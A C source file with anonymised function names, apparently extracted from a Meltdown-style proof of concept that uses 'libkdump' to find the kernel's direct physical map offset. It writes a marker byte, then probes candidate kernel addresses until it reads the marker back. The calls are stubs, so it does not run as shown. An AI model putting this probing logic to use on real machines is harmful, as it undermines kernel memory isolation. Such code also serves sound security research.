#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_1__ ;

/* Type definitions */
struct TYPE_4__ {int retries; int measurements; } ;
typedef  TYPE_1__ libkdump_config_t ;

/* Variables and functions */
 size_t DEFAULT_PHYSICAL_OFFSET ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 TYPE_1__ FUNC4 () ; 
 int /*<<< orphan*/  FUNC5 (TYPE_1__) ; 
 int FUNC6 (size_t) ; 
 size_t FUNC7 (size_t) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int /*<<< orphan*/  stdout ; 

int FUNC9(int argc, char *argv[]) {
  size_t scratch[4096];
  libkdump_config_t config;
  size_t offset = DEFAULT_PHYSICAL_OFFSET;
#ifdef __x86_64__
  size_t step = 0x800000000ll;
#else
  size_t step = 0x1000000;
#endif
  size_t delta = -2 * step;
  int progress = 0;

  FUNC3(0);

  config = FUNC4();
  config.retries = 10;
  config.measurements = 1;

  FUNC5(config);

  size_t var = (size_t)(scratch + 2048);
  *(char *)var = 'X';

  size_t start = FUNC7(var);
  if (!start) {
    FUNC8("\x1b[31;1m[!]\x1b[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
    FUNC0(1);
  }

  while (1) {
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';

    int res = FUNC6(start + offset + delta);
    if (res == 'X') {
      FUNC8("\r\x1b[32;1m[+]\x1b[0m Direct physical map offset: \x1b[33;1m0x%zx\x1b[0m\n", offset + delta);
      FUNC1(stdout);
      break;
    } else {
      delta += step;
      if (delta >= -1ull - offset) {
        delta = 0;
        step >>= 4;
      }
      FUNC8("\r\x1b[34;1m[%c]\x1b[0m 0x%zx    ", "/-\\|"[(progress++ / 400) % 4], offset + delta);
    }
  }

  FUNC2();

  return 0;
}